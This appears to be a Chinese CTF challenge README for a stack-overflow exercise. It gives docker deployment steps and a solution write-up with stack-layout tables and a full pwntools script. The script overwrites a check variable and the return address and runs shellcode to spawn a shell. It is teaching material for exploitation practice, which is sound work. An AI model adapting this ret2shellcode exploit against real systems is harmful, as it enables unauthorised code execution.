# pwn1-栈 easystack


## 介绍

本题主要考验同学们对栈溢出的掌握，具体来说考察ret2shellcode的技巧，比较简单，希望每位同学都能够完成。


## 部署

使用`xinetd`来部署题目，用于打包docker镜像的文件位于`easystack`目录下：

1. 修改`bin/flag`为你想要的flag值

2. 将编译好的题目二进制文件`easystack`放置于`bin/`目录下

3. 修改`ctf.xinetd`的`server_args`使其执行题目二进制文件；修改`port`为容器内某自定义端口（e.g., 10010）；

4. 修改Dockerfile中的`EXPOSE`端口与上面的`port`一致

5. 构建容器镜像并创建容器：

    ```bash
    docker built -t easystack .
    docker run -itd -p 31051:10010 --name ctfd_easystack easystack
    ```

6. 执行`nc localhost 31051`来验证题目是否部署成功


## 题解

1. 逆向与验证：程序的主要功能是：打印s的起始地址、接收用户输入、检查v5如果v5!=0xDEADBEEF，就执行exit(0)，否则正常return。nc服务器程序发现每次打印的s起始地址在变化，说明服务器开启了地址空间随机化。

2. 攻击思路：用户可以控制输入s进行栈溢出攻击，攻击payload要满足三个条件：1）将v5覆盖写为0xDEADBEEF。2）将return address修改为shellcode地址（或shellcode前的NOP Sled）。3）在payload输入尾部插入shellcode，并用NOP填充。

3. 栈布局：

溢出前的栈布局：

| 栈地址   | 内容           |
| -------- | -------------- |
| ...      | ...            |
| ebp+4    | return address |
| ebp      | previous ebp   |
| ebp-8    | v5             |
| ...      | ...            |
| ebp-0x48 | s              |

溢出后的栈布局：

| 栈地址   | 内容                                           |
| -------- | ---------------------------------------------- |
| addr     | **shellcode**                                  |
| ...      | **NOP Sled**                                   |
| ebp+4    | **new return address** (minimum addr is ebp+8) |
| ebp      | ...                                            |
| ebp-8    | **new v5**                                     |
| ...      | ...                                            |
| ebp-0x48 | s                                              |

4. exploit编写：

```python
#!/usr/bin/env python3
import re
from pwn import *

# set and load target program
p = remote('*server_ip*', 31051)

# receive the first printed bytes
print_info_byte = p.recv()
print_info_str = print_info_byte.decode('utf-8', 'ignore')

# find address of s by regex (find 0xXXX... in print_info_str)
pattern = r'0x[0-9a-fA-F]+'
match = re.search(pattern, print_info_str)
s_address = int(match.group(0), 16)
print('address of s:', hex(s_address))

# construct shellcode for 32-bit
shellcode = asm(shellcraft.sh())

# rewrite the value of return address (s address is ebp-72, return address is ebp+4)
ret_offset = 76
return_address = p32(s_address + ret_offset + 4)

# rewrite value of v5 to what we need
v5_offset = 64
v5_value = p32(0xDEADBEEF)

# construct payload, remember to add \n for gets()
payload = b'A'*v5_offset  + v5_value + b'A'*(ret_offset-v5_offset-4) + return_address + shellcode + b'\n'

# send payload
p.sendline(payload)

# get interactive shell
p.interactive()
```

也可以参照之前stack overflow实验的`exploit.py`来构建攻击代码。

5. 获取flag：执行`exploit.py`获取到shell之后，通过`cat flag`获取flag。